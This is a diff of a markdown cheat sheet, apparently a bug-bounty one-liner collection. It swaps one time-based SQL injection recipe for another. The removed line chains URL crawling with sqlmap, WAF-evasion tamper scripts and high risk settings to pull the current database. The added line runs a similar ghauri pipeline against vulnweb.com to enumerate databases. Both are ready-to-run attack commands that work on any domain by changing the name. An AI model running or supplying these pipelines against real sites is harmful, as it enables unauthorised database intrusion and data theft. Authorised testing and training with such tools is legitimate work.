@@ -16,6 +16,5 @@ urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplac
 
 ### Time Based SQLi
 ```
-urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;sqlmap -m sqli.txt --technique=T --level=5 --risk=3 --tamper=space2comment,space2plus,space2randomblank,space2morehash,between,randomcase,charencode,symboliclogical --batch --random-agent --no-cast --time-sec=10 --current-db --count
+urlfinder -d "vulnweb.com" -all | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|jspx|cfm|xml)' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew>sqli.txt;ghauri -m sqli.txt --level=3 --dbs --batch --confirm --technique=T
 ```
-<p>install <a href="https://github.com/projectdiscovery/urlfinder" target="_blank">urlfinder</a>, <a href="https://github.com/tomnomnom/qsreplace" target="_blank">qsreplace</a>, <a href="https://github.com/tomnomnom/anew" target="_blank">anew</a>, <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a></p>
